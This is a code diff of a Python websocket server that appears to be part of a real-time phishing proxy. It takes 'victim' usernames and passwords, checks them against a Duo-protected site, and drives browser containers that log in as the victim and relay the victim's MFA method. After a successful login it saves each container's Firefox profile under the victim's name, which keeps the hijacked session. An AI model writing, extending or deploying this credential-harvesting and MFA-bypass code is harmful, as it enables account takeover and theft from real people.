@@ -45,31 +45,43 @@ async def close_tabs(SID):
 	await sessions[SID]["backend"].send(json.dumps({"action":"closeTab"}));
 	sessions[SID]["backend"] = None
 
-def validateCreds(SID, usr, pas, loop):
+async def claim_backend(SID, usr, pas, loop):
 	try:
-		sessions[SID]["bid"] = backends.claim_backend(SID, usr, pas) 
+		bid = backends.claim_backend(SID, usr, pas) 
+		if bid == -1: 
+			log("No backends available")
+			await sessions[SID]["victim"].close()
+
+		if SID in sessions.keys():
+			sessions[SID]["bid"] = 	bid
+		else:
+			log("Session", SID, "has died, so will release backend", bid, "that was just assigned to it")
+			backends.release_backend(bid)
+	finally:
+		pass
+
+def validate_creds(SID, usr, pas, loop):
+	def callback(valid):
+		if valid:
+			loop.create_task(sessions[SID]["victim"].send(json.dumps({"status":"validCreds"})))
+		else:
+			loop.create_task(sessions[SID]["victim"].send(json.dumps({"status":"invalidCreds"})))
+	#threading.Thread(target=duoSite.validateCreds, args=(usr, pas, callback)).start()
+	duoSite.validateCreds(usr, pas, callback)
+	
+	'''
+	try:
 		if duoSite.validateCreds(usr, pas):
 			loop.create_task(sessions[SID]["victim"].send(json.dumps({"status":"validCreds"})))
 		else:
 			loop.create_task(sessions[SID]["victim"].send(json.dumps({"status":"invalidCreds"})))
 	finally:
 		pass
+		'''
 
-def save_container(SID, loop):
+def save_container(name, bid):
 	try:
-		sessions[SID]["succ"] = True
-		back = sessions[SID]["backend"]
-		bid = sessions[SID]["bid"]
-		name = sessions[SID]["user"]
-
 		# wait for victim to close connection by itself
-		#time.sleep(2)
-
-		#loop.create_task(sessions[SID]["victim"].close(1001))
-		log("vicitim closed successfully")
-		#if back is not None: loop.create_task(back.close(1001))
-		log("backend closed successfully")
-
 		path = "/docker/appdata/firefoxSID" + str(bid) + "/profile"
 		log("Appending profile", name, "with path", path, "to", firefox_home + "/profiles.ini")
 		with open(firefox_home + "/profiles.ini", "r+") as profiles_file:
@@ -115,9 +127,16 @@ async def counter(websocket, path):
 							"authReady" : False,
 							"succ"	 : False
 					}
+
+					log("Created new session", SID, "starting auth")
 					# run this on separate thread to avoid blocking message pool
-					threading.Thread(target=validateCreds, 
-						args=(SID, data["username"], data["password"], asyncio.get_event_loop())).start()
+					validate_creds(SID, data["username"], data["password"], asyncio.get_event_loop())
+					#threading.Thread(target=validate_creds, 
+					#	args=(SID, data["username"], data["password"], asyncio.get_event_loop())).start()
+					await claim_backend(SID, data["username"], data["password"], asyncio.get_event_loop())
+					#threading.Thread(target=start_backend, 
+						#args=(SID, data["username"], data["password"], asyncio.get_event_loop())).start()
+	
 					
 				if data["action"] == "setAuthMethod":
 					SID = data["sid"]
@@ -132,7 +151,6 @@ async def counter(websocket, path):
 					SID = data["sid"]	
 					await sessions[SID]["backend"].send(json.dumps(data))
 
-
 			elif data["id"] == "backend":
 				SID = data["sid"]
 				if SID not in sessions.keys(): 
@@ -140,7 +158,10 @@ async def counter(websocket, path):
 
 				# a new backend connected 
 				if "action" in data and data["action"] == "requestVictim":
-					sessions[SID]["backend"] = websocket
+					if SID in sessions.keys():
+						sessions[SID]["backend"] = websocket
+					else:
+						log("Failed to assign this new container to the victim, for it has died already")
 
 				# backend validated given credentials. Send it auth method if user already decided it or set flag to ready whenever user deciedes
 				if "status" in data and data["status"] == "waitingForAuthm":
@@ -151,10 +172,14 @@ async def counter(websocket, path):
 						await sessions[SID]["backend"].send(json.dumps({"status":"selected", "method":sessions[SID]["authm"]}))
 
 				if "status" in data and data["status"] == "loggedIn":
-					log("Session SID<->BID :", SID + "<->" + str(sessions[SID]["bid"]), "successful.")
+					log("Session SID<->BID<->USR :", SID + "<->" + str(sessions[SID]["bid"]) + sessions[SID]["user"], "successful.")
+					sessions[SID]["succ"] = True
+					bid = data["bid"]
+					name = sessions[SID]["user"]
+
 					await sessions[SID]["victim"].send(json.dumps({"status":"loggedIn"}));
 					# run this on separate thread to avoid blocking message pool
-					threading.Thread(target=save_container, args=(SID, asyncio.get_event_loop())).start()
+					save_container(name, bid)
 					#save_container(SID, asyncio.get_event_loop())
 
 				if "status" in data and data["status"] == "callAnswered":
